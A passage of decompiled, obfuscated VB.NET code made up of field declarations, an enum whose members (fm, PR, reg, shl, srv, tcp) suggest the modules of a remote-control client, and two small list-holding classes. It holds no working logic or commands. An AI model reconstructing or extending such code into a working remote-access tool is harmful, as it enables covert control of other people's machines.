		Public PRNXT As Boolean

		' Token: 0x0400016F RID: 367
		Public RGCH As Collection

		' Token: 0x04000170 RID: 368
		Public shStarted As Integer

		' Token: 0x04000171 RID: 369
		Public sk As Client

		' Token: 0x04000172 RID: 370
		Public SrvFX As Boolean

		' Token: 0x04000173 RID: 371
		Public srvNxt As Boolean

		' Token: 0x04000174 RID: 372
		Private string_0 As String

		' Token: 0x04000175 RID: 373
		Private string_1 As String()

		' Token: 0x04000176 RID: 374
		Public TCPFX As Boolean

		' Token: 0x04000177 RID: 375
		Public TCPNXT As Boolean

		' Token: 0x02000014 RID: 20
		Public Enum CR
			' Token: 0x04000179 RID: 377
			fm
			' Token: 0x0400017A RID: 378
			PR
			' Token: 0x0400017B RID: 379
			reg = 3
			' Token: 0x0400017C RID: 380
			shl
			' Token: 0x0400017D RID: 381
			srv
			' Token: 0x0400017E RID: 382
			tcp = 2
		End Enum

		' Token: 0x02000015 RID: 21
		Public NotInheritable Class GClass13
			' Token: 0x0600033B RID: 827 RVA: 0x00002FC3 File Offset: 0x000011C3
			Public Sub New()
				Me.list_0 = New List(Of String())()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x0400017F RID: 383
			Public list_0 As List(Of String())

			' Token: 0x04000180 RID: 384
			Public list_1 As List(Of String)

			' Token: 0x04000181 RID: 385
			Public string_0 As String
		End Class

		' Token: 0x02000016 RID: 22
		Public NotInheritable Class GClass14
			' Token: 0x0600033C RID: 828 RVA: 0x00002FE1 File Offset: 0x000011E1
			Public Sub New()
				Me.list_0 = New List(Of String)()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x04000182 RID: 386
			Public list_0 As List(Of String)

			' Token: 0x04000183 RID: 387
			Public list_1 As List(Of String)

			' Token: 0x04000184 RID: 388
			Public string_0 As String
		End Class
	End Class
End Namespace
